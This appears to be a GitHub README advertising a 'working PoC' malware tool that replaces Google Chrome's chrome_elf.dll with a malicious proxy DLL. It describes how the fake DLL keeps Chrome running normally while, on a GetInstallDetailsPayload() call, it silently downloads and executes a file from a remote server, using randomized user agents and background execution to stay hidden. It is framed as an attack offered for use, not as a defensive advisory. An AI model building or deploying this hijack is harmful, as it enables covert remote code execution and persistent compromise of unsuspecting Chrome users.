# Chrome-DLL-Hijacking
DLL Hijacking/Proxying, replaces chrome_elf.dll, with yours, so whenever chrome runs, it downloads and runs your payload


![Google_Chrome_icon_(February_2022) svg](https://github.com/user-attachments/assets/2d758cd0-eafa-486f-ab4b-3450661b80c5)

https://github.com/user-attachments/assets/27940213-af01-4163-85db-361f8f0beffa

https://t.me/ZeroTraceDevOfficial

# Chrome ELF DLL Hijacking Exploit

**Created by:** zerotrace  
**Type:** DLL Hijacking/Proxy Attack  
**Target:** Google Chrome (chrome_elf.dll)  
**Status:** Working PoC  

## 🎯 Overview

This exploit demonstrates a DLL hijacking vulnerability in Google Chrome by replacing the legitimate `chrome_elf.dll` with a malicious proxy DLL that intercepts function calls while maintaining Chrome's functionality.

## 🔧 How It Works

1. **DLL Replacement**: The exploit replaces Chrome's original `chrome_elf.dll` with our custom proxy DLL
2. **Function Interception**: Our DLL exports all the same functions as the original chrome_elf.dll
3. **Payload Execution**: When Chrome calls `GetInstallDetailsPayload()`, our code executes
4. **Stealth Execution**: The malicious activities occur while Chrome continues to function normally

## 📝 Technical Details

### Attack Flow:
1. Chrome.exe starts and loads our fake chrome_elf.dll
2. Our DLL executes malicious code when Chrome calls specific functions
3. The payload downloads and executes a file from a remote server
4. Chrome continues running without any visible issues to the user

### Key Components:
- **Proxy Functions**: All original chrome_elf.dll exports are maintained
- **Payload Trigger**: Activates on `GetInstallDetailsPayload()` function call
- **Stealth Features**: 
 - Randomized user agents for downloads
 - Single execution flag to avoid repeated payloads
 - Silent background execution

### Exploited Functions:
```cpp
__declspec(dllexport) BOOL WINAPI GetInstallDetailsPayload(void* payload, size_t* payload_size)
